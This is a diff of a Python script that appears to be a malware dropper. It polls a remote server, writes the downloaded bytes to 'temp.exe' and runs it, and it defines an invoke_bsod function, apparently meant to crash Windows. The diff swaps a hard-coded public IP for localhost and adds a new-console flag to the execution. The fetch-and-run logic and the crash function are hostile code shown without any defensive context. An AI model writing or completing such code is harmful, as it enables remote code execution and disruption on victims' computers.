@@ -1,11 +1,11 @@
+from subprocess import CREATE_NEW_CONSOLE, Popen
 from PIL import UnidentifiedImageError, Image
 from requests import Response, get
-from subprocess import Popen
 from time import sleep
 from os import remove
 
 DELAY = 5
-IP = "143.42.110.206"
+IP = "127.0.0.1"
 PORT = 80
 SCHEME = "http"
 
@@ -30,7 +30,7 @@ def main() -> None:
 def run_file(content: bytes) -> None:
     with open("temp.exe", "wb") as temp_file:
         temp_file.write(content)
-    Popen("temp.exe")
+    Popen("temp.exe", creationflags=CREATE_NEW_CONSOLE)
 
 
 def invoke_bsod() -> None:
